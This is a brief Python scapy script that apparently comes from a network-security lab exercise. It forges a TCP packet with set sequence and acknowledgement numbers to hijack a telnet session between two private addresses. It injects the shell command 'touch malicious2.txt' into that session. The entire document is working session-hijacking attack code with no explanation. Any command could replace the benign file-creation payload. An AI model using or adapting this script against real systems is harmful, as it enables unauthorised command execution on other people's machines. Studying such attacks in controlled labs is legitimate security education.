#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=47856, dport=23, flags=0x10|0x08, seq=194587907, ack=37687865)
data = "touch malicious2.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)